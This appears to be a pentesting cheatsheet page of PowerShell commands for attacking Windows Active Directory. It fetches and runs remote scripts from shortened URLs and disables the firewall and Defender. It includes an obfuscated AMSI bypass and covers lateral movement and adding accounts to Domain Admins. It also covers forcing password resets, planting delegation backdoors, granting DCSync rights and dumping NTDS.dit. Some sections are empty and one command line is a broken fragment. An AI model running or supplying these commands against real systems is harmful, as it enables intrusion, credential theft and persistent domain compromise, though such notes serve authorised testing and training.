---
layout: post
title: Offensive Powershell - Part 2 Privilege Escalation
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
has_children: true
modified_date: 2021-11-18
---
<!-- vscode-markdown-toc -->
* [PRE-REQUISITE: Installing PowerUp and PowerSploit](#PRE-REQUISITE:InstallingPowerUpandPowerSploit)
* [PRE-REQUISITE: SECURITY TAMPRING](#PRE-REQUISITE:SECURITYTAMPRING)
* [LATERAL MOVEMENT](#LATERALMOVEMENT)
* [PRIVESC](#PRIVESC)
* [TOKEN IMPERSONATION](#TOKENIMPERSONATION)
* [ADD MEMBER](#ADDMEMBER)
* [FORCE PASSWORD CHANGE](#FORCEPASSWORDCHANGE)
* [KERBEROASTING](#KERBEROASTING)
* [ABUSING DELEGATION](#ABUSINGDELEGATION)
* [DUMP NTDS.DIT](#DUMPNTDS.DIT)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='PRE-REQUISITE:InstallingPowerUpandPowerSploit'></a>PRE-REQUISITE: Installing PowerUp and PowerSploit

- [PowerUp CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
- [PowerSploit CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerSploit.pdf)

```powershell
# ActiveDirectory Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# PowerUp Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1

# PowerSploit Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
```

## <a name='PRE-REQUISITE:SECURITYTAMPRING'></a>PRE-REQUISITE: SECURITY TAMPRING
```powershell
# windows firewall showing / disabling config 
netsh advfirewall set allprofiles state off
netsh advfirewall show allprofiles

# powershell execution protection bypass
powershell -ep bypass

# powershell fullLanguage / Constrained language mode
# https://seyptoo.github.io/clm-applocker/
$Env:__PSLockdownPolicy
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v __PSLockdownPolicy /t REG_SZ /d ConstrainedLanguage /f
/v fDenyTSConnections /t REG_DWORD /d 1 /f
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage

# powershell remoting enable / verify (Needs Admin Access)
Enable-PSRemoting

# RDP : enable / disable / check access
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# WMI remoting as user authenticated on the Da / execution with DC privileges
Set-RemoteWMI -UserName johndoe -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose

# Windows Defender disabling features
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Set-MpPreference -DisableIOAVProtection $true

# Windows Defender AMSI Bypass  
# https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## <a name='LATERALMOVEMENT'></a>LATERAL MOVEMENT
```powershell
Invoke-DCOM
Invoke-SMBExec
Invoke-PsExec
Invoke-Command
mstsc.exe
```

## <a name='PRIVESC'></a>PRIVESC
```
Get-Hotfix
```

## <a name='TOKENIMPERSONATION'></a>TOKEN IMPERSONATION

## <a name='ADDMEMBER'></a>ADD MEMBER
```
# OPTION 1
net group "Domain admins" dagreat /add /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred

# VERIFICATION
Get-DomainGroupMember -Identity 'Domain Admins'
```


## <a name='FORCEPASSWORDCHANGE'></a>FORCE PASSWORD CHANGE
```
# OPTION 1
net user dagreat Password123! /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credential $Cred
```

## <a name='KERBEROASTING'></a>KERBEROASTING
```

```
## <a name='ABUSINGDELEGATION'></a>ABUSING DELEGATION
```
# configure the CD backdoor with proto transition
Get-ADComputer -Identity <ServiceA> | Set-ADAccountControl -TrustedToAuthForDelegation $true
Set-ADComputer -Identity DC01 -Add @{'msDS-AllowedDelegationTo'=@('CIFS/DC01.corp')}

# configure a RBCD backdoor
# ServiceB has 'msDS-AllowedToActOnBehalfOfOtherIdentity' set, pointing to ServiceA
Set-ADComputer <ServiceB> -PrincipalAllowedToDelegateToAccount <ServiceA>

# trigger the backdoor
[Reflection::Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<DAgreat>')
$idToImpersonate.Impersonate()
```

# Set A DCSYNC
```
Add-ObjectAcl -TargetDistinguishedName "dc=<DC01>,dc=local" -PrincipalSamAccountName <sogreatW -Rights DCSync -Verbose
```

## <a name='DUMPNTDS.DIT'></a>DUMP NTDS.DIT
```
ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit quit
```
